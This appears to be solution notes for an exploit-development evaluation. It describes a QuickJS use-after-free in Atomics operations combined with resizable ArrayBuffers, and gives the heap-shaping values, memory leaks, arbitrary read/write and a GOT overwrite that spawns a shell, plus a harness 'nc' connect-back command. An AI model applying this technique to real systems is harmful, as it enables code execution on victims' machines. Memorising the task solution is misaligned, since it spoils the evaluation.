# QuickJS Atomics + Resizable ArrayBuffer Exploit (exec-shell)

## Vulnerability
`js_atomics_op()` (and `js_atomics_store()`) calls `js_atomics_get_ptr()` to compute a raw element pointer `ptr` into a TypedArray’s backing store, then converts the value argument with `JS_ToUint32()` / `JS_ToBigInt64()`. The conversion can invoke user JS via `valueOf()`. If user code resizes a resizable ArrayBuffer (RAB) during `valueOf()`, the backing store may be reallocated/split, making the saved `ptr` stale. The atomic operation then reads/writes through that stale pointer (UAF / OOB).

## Core exploitation idea
Use the stale atomic write as a **write-what-where into a newly allocated object**:

1. Start with a RAB whose data chunk is big enough to be split by `realloc()`.
2. During `valueOf()`, shrink the RAB so that `realloc()` splits off a **free remainder chunk**.
3. Still inside `valueOf()`, allocate a new `ArrayBuffer`. Its internal `JSArrayBuffer` metadata struct (`sizeof(JSArrayBuffer)=56`) is allocated with `js_malloc()`. With the right sizing, this allocation reuses the free remainder chunk.
4. When `valueOf()` returns, `js_atomics_op()` performs the atomic operation through the stale `ptr`, which now points *into the freshly allocated `JSArrayBuffer` struct*. This lets us corrupt fields such as `JSArrayBuffer.data` (arbitrary pointer).

## Heap shaping used in the PoC
We want the remainder chunk to have the same malloc size class as `JSArrayBuffer` (request 56 bytes).

The PoC uses:
- RAB initial length `0x88`
- Shrink to `0x40` during `valueOf()`

This causes glibc `realloc()` to split the original data chunk, producing a remainder chunk in the correct bin so that the next `js_malloc(sizeof(JSArrayBuffer))` for `new ArrayBuffer()` reuses it.

With a `BigInt64Array` view, the stale pointer can be aimed at specific 8-byte fields inside `JSArrayBuffer` by choosing the index:
- `IDX_ABUF_DATA_PTR = 12` targets offset `0x60` (the `data` pointer field)
- `IDX_ABUF_FREE_FUNC = 16` targets offset `0x80` (the `free_func` field)

## Building primitives
### 1) Leak qjs PIE base
The overlapped `JSArrayBuffer.free_func` points to `js_array_buffer_free` inside the PIE `qjs` binary.

We leak `free_func` via an atomic **read** (`Atomics.add` with `+0n`), then compute:

```
qjs_base = leaked_free_func - OFF_JS_ARRAY_BUFFER_FREE
```

### 2) Arbitrary read/write via `JSArrayBuffer.data`
Using the same overlap, we overwrite `JSArrayBuffer.data` (offset 16) with an arbitrary address using `Atomics.exchange` on `IDX_ABUF_DATA_PTR`.

Then a `DataView` over that corrupted `ArrayBuffer` reads/writes process memory at the chosen address.

### 3) Leak libc base and patch control flow
With `qjs_base` known, we compute the address of `fwrite@GOT` and read it to get the resolved libc address of `fwrite`:

```
libc_base = *(uint64_t*)fwrite_got - OFF_LIBC_FWRITE
system    = libc_base + OFF_LIBC_SYSTEM
```

Then we overwrite `fwrite@GOT` with `system`.

## Spawning a shell (exec-shell)
To trigger `system()` with a controlled command string **without using forbidden QuickJS helpers**, we reuse QuickJS’s built-in `print()` implementation.

`print(str)` calls:

```
fwrite(str_ptr, 1, len, stdout);
```

After patching `fwrite@GOT -> system`, this becomes `system(str_ptr)`.

The PoC calls:

```
print('sh\u0000');
```

The string contains an embedded NUL, so `system()` sees a proper NUL-terminated command `"sh"`.
`system("sh")` runs `/bin/sh -c sh`, which spawns a shell that reads and executes stdin.

The harness pipes `nc 127.0.0.1 9999\n` to stdin, so the spawned shell executes it and connects back, satisfying the verifier.

## Notes
- The process may abort after the callback because corrupted `ArrayBuffer` objects can later be freed with invalid `data` pointers. This is acceptable for the evaluation because the callback happens while the shell is running (before teardown).
